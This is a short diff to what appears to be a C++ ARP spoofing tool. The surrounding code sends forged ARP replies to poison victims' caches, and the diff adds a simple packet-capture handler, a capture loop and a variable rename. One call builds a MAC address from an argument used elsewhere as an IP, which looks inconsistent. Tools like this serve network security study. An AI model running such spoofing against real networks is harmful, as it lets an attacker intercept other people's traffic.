@@ -65,6 +65,17 @@ int send_packet_arp(Mac dmac, Mac smac, Mac tmac, Ip sip, Ip tip, bool isRequest
     return res;
 }
 
+void packet_handler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data) {
+    struct EthHdr *eth_header;
+    eth_header = (struct EthHdr *)pkt_data;
+
+    // Check if the packet is an ARP packet
+    if (ntohs(eth_header->type_) == EthHdr::Arp) {
+        printf("ARP packet captured!\n");
+        // You can add more detailed processing here if needed
+    }
+}
+
 
 int main(int argc, char* argv[]) {
 	if (argc <4 || (argc%2)!=0) {
@@ -107,10 +118,12 @@ int main(int argc, char* argv[]) {
 				if (static_cast<uint32_t>(arp_hdr->sip()) == static_cast<uint32_t>(Ip(argv[2 * i]))) break;
 			}
 		}
-		Mac victim_mac = arp_hdr->smac();
-		if(send_packet_arp(Mac(argv[2*i]),Mac(my_mac),Mac(victim_mac),Ip(argv[2*i+1]),Ip(argv[2*i]),false)==0){
+		Mac sender_mac = arp_hdr->smac();
+		if(send_packet_arp(Mac(argv[2*i]),Mac(my_mac),Mac(sender_mac),Ip(argv[2*i+1]),Ip(argv[2*i]),false)==0){
 			printf("Target %d Attacked!\n", i);
 		}
 	}
+
+	pcap_loop(handle, 0, packet_handler, NULL);
 	pcap_close(handle);
 }
